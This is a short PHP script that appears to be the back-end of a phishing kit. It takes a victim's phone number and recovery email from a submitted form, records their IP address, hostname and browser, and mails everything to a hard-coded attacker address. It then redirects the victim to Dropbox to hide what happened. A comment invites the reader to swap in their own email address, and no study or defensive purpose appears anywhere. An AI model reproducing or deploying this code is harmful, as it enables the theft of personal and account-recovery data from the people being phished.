<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------PHONE ETC-----------------------\n";
$message .= "phone: ".$_POST['phoneNumber']."\n";
$message .= "recovery: ".$_POST['recEmail']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
//change ur email here
$send = "ouryearofgreatnest2019@outlook.com";
$subject = "Login | $ip - MRV -";
{
mail("$send", "$subject", $message); 
}
$praga=rand();
$praga=md5($praga);
header ("Location: https://www.dropbox.com/");

?>
